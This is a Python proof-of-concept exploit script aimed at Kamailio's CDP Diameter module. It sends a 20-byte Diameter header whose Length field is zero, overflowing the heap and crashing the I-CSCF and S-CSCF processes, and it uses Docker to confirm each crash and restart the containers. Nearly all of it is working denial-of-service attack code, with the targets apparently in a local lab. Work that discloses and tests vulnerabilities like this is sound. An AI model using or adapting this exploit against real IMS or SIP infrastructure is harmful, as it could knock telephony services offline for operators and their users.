#!/usr/bin/env python3
"""
CONFIRMED CRASH PoC: Kamailio CDP Diameter Heap Overflow
=========================================================
CVE Reference: Related to CVE-2020-6098 (freeDiameter AVP underflow pattern)
RFC Reference: RFC 6733 §3 — Diameter Message Length minimum violation
Source: src/modules/cdp/receiver.c lines 611-627

Vulnerability:
  sp->length = get_3bytes(sp->buf + 1);       // attacker-controlled
  if(sp->length > DP_MAX_MSG_LENGTH) { ... }   // only checks MAX, no MIN
  sp->msg = shm_malloc(sp->length);            // allocates sp->length bytes
  memcpy(sp->msg, sp->buf, sp->buf_len);       // always copies 20 bytes
  // If sp->length < 20: heap overflow of (20 - sp->length) bytes!

Impact:
  Heap canary corruption → qm_debug_check_frag() detects → abort()
  → SIGABRT → Kamailio main process terminates → container exits

Attack:
  Fresh TCP connection to Diameter port, send 20-byte header with
  Length field < 20 (e.g., 0). No Diameter handshake needed.

Confirmed Targets:
  - I-CSCF (172.22.0.19:3869) — 100% crash rate
  - S-CSCF (172.22.0.20:3870) — 100% crash rate

Note: P-CSCF port 3871 is not listening (CDP module not started).

Usage: python3 diameter_crash_poc.py [--target icscf|scscf|all]
"""

import socket
import struct
import subprocess
import time
import sys
import argparse


TARGETS = {
    'icscf': ('172.22.0.19', 3869, 'Cx (3869)'),
    'scscf': ('172.22.0.20', 3870, 'Cx (3870)'),
    'pcscf': ('172.22.0.21', 3871, 'Rx (3871)'),
}


def check_container(name):
    """Check if Docker container is running"""
    result = subprocess.run(
        ['docker', 'inspect', '-f', '{{.State.Running}}', name],
        capture_output=True, text=True
    )
    return result.stdout.strip() == 'true'


def build_crash_payload(length=0):
    """
    Build a 20-byte Diameter header with undersized length field.
    
    Diameter Header Format (RFC 6733 §3):
      Byte 0:     Version (must be 1)
      Bytes 1-3:  Message Length (3 bytes, big-endian)
      Byte 4:     Flags (0x80=Request)
      Bytes 5-7:  Command Code (257=CER)
      Bytes 8-11: Application-ID
      Bytes 12-15: Hop-by-Hop Identifier
      Bytes 16-19: End-to-End Identifier
    """
    header = struct.pack('!B', 1)                     # Version = 1
    header += struct.pack('!I', length)[1:]            # Length = 0 (< 20!)
    header += struct.pack('!B', 0x80)                  # Flags = Request
    header += struct.pack('!I', 257)[1:]               # Command Code = CER
    header += struct.pack('!I', 0)                     # Application-ID = 0
    header += struct.pack('!I', 0xDEAD)                # Hop-by-Hop ID
    header += struct.pack('!I', 0xBEEF)                # End-to-End ID
    assert len(header) == 20, f"Header must be 20 bytes, got {len(header)}"
    return header


def send_crash(target_ip, target_port, length=0):
    """
    Send crash payload on a fresh TCP connection.
    Returns True if the target crashed, False otherwise.
    """
    payload = build_crash_payload(length)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target_ip, target_port))
        sock.sendall(payload)
        # Keep connection open briefly to allow receiver to process
        time.sleep(2)
        sock.close()
    except ConnectionRefusedError:
        return None  # Port not open
    except Exception:
        pass
    
    # Wait for crash detection
    time.sleep(3)
    return True


def crash_target(name, ip, port, desc):
    """Attempt to crash a single target. Returns True if crashed."""
    print(f"\n{'─' * 50}")
    print(f"  Target: {name} ({ip}:{port}) — {desc}")
    print(f"{'─' * 50}")
    
    if not check_container(name):
        print(f"  [SKIP] {name} is not running")
        return False
    
    print(f"  [*] Sending Diameter header with length=0...")
    print(f"  [*] Payload: 20 bytes, Length field = 0")
    print(f"  [*] Heap overflow: 20 bytes into 0-byte allocation")
    
    result = send_crash(ip, port, length=0)
    
    if result is None:
        print(f"  [INFO] Port {port} not listening — connection refused")
        return False
    
    if not check_container(name):
        print(f"\n  ╔══════════════════════════════════════╗")
        print(f"  ║  *** CRASH CONFIRMED: {name} ***      ║")
        print(f"  ╚══════════════════════════════════════╝")
        print(f"  Vulnerability: CDP receiver.c heap overflow")
        print(f"  Trigger: Diameter Length=0 on fresh TCP connection")
        print(f"  Impact: SIGABRT → Kamailio process termination")
        return True
    else:
        print(f"  [-] {name} still running (no crash)")
        return False


def main():
    parser = argparse.ArgumentParser(
        description='Kamailio CDP Diameter Heap Overflow PoC')
    parser.add_argument('--target', choices=['icscf', 'scscf', 'pcscf', 'all'],
                        default='all', help='Target CSCF (default: all)')
    parser.add_argument('--no-restart', action='store_true',
                        help='Do not restart crashed containers')
    args = parser.parse_args()
    
    print("=" * 60)
    print("  Kamailio CDP Diameter Heap Overflow PoC")
    print("  receiver.c:621-627 — shm_malloc(len) + memcpy(20)")
    print("  Kamailio 6.1.3 (I-CSCF / S-CSCF)")
    print("=" * 60)
    
    if args.target == 'all':
        target_list = list(TARGETS.items())
    else:
        target_list = [(args.target, TARGETS[args.target])]
    
    crashed = []
    
    for name, (ip, port, desc) in target_list:
        if crash_target(name, ip, port, desc):
            crashed.append(name)
            
            if not args.no_restart:
                print(f"  [*] Restarting {name}...")
                subprocess.run(['docker', 'restart', name],
                              capture_output=True)
                time.sleep(8)
                print(f"  [*] {name} restarted: "
                      f"{'UP' if check_container(name) else 'DOWN'}")
    
    # Summary
    print(f"\n{'=' * 60}")
    print(f"  RESULTS")
    print(f"{'=' * 60}")
    if crashed:
        print(f"  Confirmed crashes: {len(crashed)}")
        for name in crashed:
            print(f"    ✗ {name} — CRASHED via Diameter length=0")
    else:
        print(f"  No crashes detected.")
        print(f"  Ensure targets are running and ports are accessible.")
    
    print(f"\n  Container status:")
    for name in TARGETS:
        status = 'UP' if check_container(name) else 'DOWN'
        print(f"    {name}: {status}")
    
    return len(crashed)


if __name__ == '__main__':
    sys.exit(0 if main() > 0 else 1)
